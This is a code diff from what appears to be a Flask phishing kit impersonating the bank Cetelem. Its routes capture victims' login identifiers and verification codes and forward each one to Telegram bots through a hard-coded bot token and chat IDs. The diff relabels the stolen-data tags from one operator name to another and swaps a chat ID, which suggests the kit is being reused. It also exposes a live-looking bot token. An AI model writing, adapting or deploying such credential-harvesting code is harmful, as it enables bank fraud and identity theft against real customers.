@@ -14,7 +14,7 @@ CHAT_ID_2 = '7650873997'
 
 # Bot 3 (NOUVEAU)
 TOKEN_3 = '7858273702:AAEMIDAD8ZwY_Y2iZliX-5YPXNoHCkeB9HQ'
-CHAT_ID_3 = '5214147917'
+CHAT_ID_3 = '52141479'
 
 UPLOAD_FOLDER = 'uploads'
 if not os.path.exists(UPLOAD_FOLDER):
@@ -70,7 +70,7 @@ def identifiant():
 def code():
     identifiant = request.form.get('identifiant')
     if identifiant:
-        send_all(f"[Identifiant cetelem hario] {identifiant}")
+        send_all(f"[Identifiant cetelem zizou] {identifiant}")
         # MODIFIÉ : Récupère les 2 derniers chiffres pour les passer à la page 'code.html'
         last_two_digits = identifiant[-2:]
         return render_template('code.html', last_two=last_two_digits)
@@ -86,7 +86,7 @@ def verification():
             data = request.get_json()
             code = data.get('code')
             if code:
-                send_all(f"[Code cetelem hario] {code}")
+                send_all(f"[Code cetelem zizou] {code}")
                 return jsonify({"redirect_url": "/chargement"})
         except Exception as e:
             print("Erreur JSON:", e)
